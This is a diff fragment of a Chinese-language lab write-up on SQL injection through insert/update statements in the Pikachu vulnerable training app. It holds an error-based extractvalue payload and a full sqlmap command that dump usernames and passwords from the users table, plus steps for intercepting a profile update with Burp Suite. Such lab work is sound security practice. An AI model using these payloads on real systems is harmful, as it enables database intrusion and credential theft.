@@ -17,3 +17,7 @@
 1' and extractvalue(1,concat(0x7e,(select group_concat(id,':',username,':',password,':') from users),0x7e)) and '  
 点击发送，查询到了id 用户名和密码  
 ![1](https://github.com/Chenyuzhiying0/111111.github.io/blob/main/image/insert%20update%E6%B3%A8%E5%85%A54.png)  
+在sqlmap中，使用指令python sqlmap.py -u "http://127.0.0.1/pikachu/vul/sqli/sqli_iu/sqli_reg.php" -data="username=shabi&password=123456&sex=1&phonenum=1&email=1&add=1&submit=submit" -batch -D pikachu -T users -C username,password -dump获得同样的效果  
+
+注册好账号后登录，登录完成后点击修改个人信息，使用burpsuite拦截submit  
+剩下的步骤和前面的一样
